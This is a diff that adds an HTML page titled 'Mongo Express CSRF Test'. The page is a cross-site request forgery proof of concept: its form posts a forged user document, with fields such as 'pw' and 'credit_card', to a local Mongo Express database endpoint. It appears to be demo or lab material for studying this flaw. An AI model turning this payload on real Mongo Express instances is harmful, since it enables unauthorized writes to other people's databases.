@@ -1,0 +1,11 @@
+<html>
+	<head>
+		<title>Mongo Express CSRF Test</title>
+	</head>
+	<body>
+		<form action="http://localhost:8081/db/NoSQLiDemo/users" method="post">
+			<label for="document">document:</label><input type="text" id="document" name="document" size="100" value="{_id: '1337', uname: 'Eve', pw: 'evil', credit_card: '000'}"><br><br>
+			<input type="submit" value="CSRF!">
+		</form>
+	</body>
+</html>
